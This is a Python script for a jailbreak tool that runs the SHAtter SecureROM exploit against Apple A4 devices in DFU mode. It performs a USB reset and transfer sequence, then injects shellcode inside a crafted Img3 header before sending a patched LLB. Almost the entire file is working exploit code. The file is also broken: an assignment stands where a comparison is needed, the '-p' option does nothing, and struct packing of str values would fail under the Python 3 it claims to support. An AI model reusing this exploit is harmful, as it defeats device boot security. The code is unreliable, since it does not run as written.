#!/usr/bin/python
#THIS FILE WAS TAKEN FROM axi0mx's ipwndfu (under GNU General Public License v3.0) UTILITY ON HIS GITHUB, I DO NOT TAKE OWNERSHIP FOR THE CODE IN THIS FILE
#THIS FILE IS ONLY MODIFIED TO SUPPORT PYTHON 3 AND REMOVE UNNEEDED MODULES AND SUPPORT OTHER CODE IN THIS PROJECT

import struct, sys, time
import dfu
import patchmaster

usage = "Usage:\n\tp - Add iBoot patches\n\tj - Jailbreak"
__MODE__ = "BAREBONES"
banner = (("=" * 39 + "\n") + ("::\n") + (":: KASSAR for A4, Copyright 2020, @frdayboy\n") + ("::\tBUILD_TAG: SHAdow\n") + ("::\tBUILD_STYLE: {}\n".format(__MODE__))+ ("::\n") + ("=" * 39 + "\n"))

def send_file(file):
    device = dfu.acquire_device()
    dfu.reset_counters(device)
    dfu.send_data(device, file)
    dfu.request_image_validation(device)
    dfu.release_device(device)

def get_shellcode():
    #Borrowed from ipwndfu/SHAtter
    shellcode_address = 0x8402F198 + 1
    data = struct.pack('<40sI', '\xF0' * 40, shellcode_address)
    tags = data + struct.pack('<4s2I4s2I', 'SHSH'[::-1], 12, 0, 'CERT'[::-1], 12, 0)
    header = struct.pack('<4s3I4s', 'Img3'[::-1], 20 + len(tags), len(tags), len(data), 'ibss'[::-1])
    assert len(patchmaster.exported_patches[patchmaster.current_stage].bin) <= 1024
    return header + tags + patchmaster.exported_patches[patchmaster.current_stage].bin

def send_patched_llb():
    patchmaster.current_stage += 1
    patchmaster.exported_patches[patchmaster.current_stage].log("Sending patched LLB...")
    data = patchmaster.exported_patches[patchmaster.current_stage].bin
    send_file(data)
    patchmaster.exported_patches[patchmaster.current_stage].log("Patching iBoot for {}".format(__MODE__))

def exploit():
    device = dfu.acquire_device()

    if 'SRTG:[iBoot-574.4]' not in device.serial_number:
        print('ERROR: CPID is compatible, but serial number string does not match.')
        print('Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.')
        sys.exit(1)

    patchmaster.exported_patches[patchmaster.current_stage].log("Starting exploit...")

    dfu.reset_counters(device)
    dfu.get_data(device, 0x40)
    dfu.usb_reset(device)
    dfu.release_device(device)

    device = dfu.acquire_device()
    time.sleep(1)
    dfu.request_image_validation(device)
    dfu.release_device(device)

    time.sleep(1)
    device = dfu.acquire_device()
    dfu.get_data(device, 0x2C000)
    dfu.release_device(device)

    time.sleep(0.5)

    device = dfu.acquire_device()
    dfu.reset_counters(device)
    dfu.get_data(device, 0x140)
    dfu.usb_reset(device)
    dfu.release_device(device)

    device = dfu.acquire_device()
    dfu.request_image_validation(device)
    dfu.release_device(device)

    device = dfu.acquire_device()
    dfu.send_data(device, get_shellcode())
    dfu.get_data(device, 0x2C000)
    dfu.release_device(device)

    time.sleep(0.5)

    device = dfu.acquire_device()
    if 'SHAdow' not in device.serial_number:
        patchmaster.exported_patches[patchmaster.current_stage].log("Exploit failed.")
        sys.exit(1)
    patchmaster.exported_patches[patchmaster.current_stage].log("Exploit Succeeded.")
    dfu.release_device(device)
    send_patched_llb()

if __name__ == '__main__':
    print(banner)
    try:
        arg1 = sys.argv[1]
        if arg1 == "-j":
            device = dfu.acquire_device()
            serial_number = device.serial_number
            dfu.release_device(device)
            if "KASSAR:[" in serial_number:
                print("[SHAdow] DFU already pwned by frdayboy")
                sys.exit(1)
            patchmaster.initialize_all_patches(serial_number)
            print("[SHAdow] Found: " + serial_number)
            exploit()
        elif arg1 = "-p":
            try:
                path = sys.argv[2]
            except IndexError:
                print("[SHAdow] Missing a path to your LLB m8")
                sys.exit(1)
            
        else:
            print(usage)
            sys.exit(1)
    except IndexError:
        print(usage)
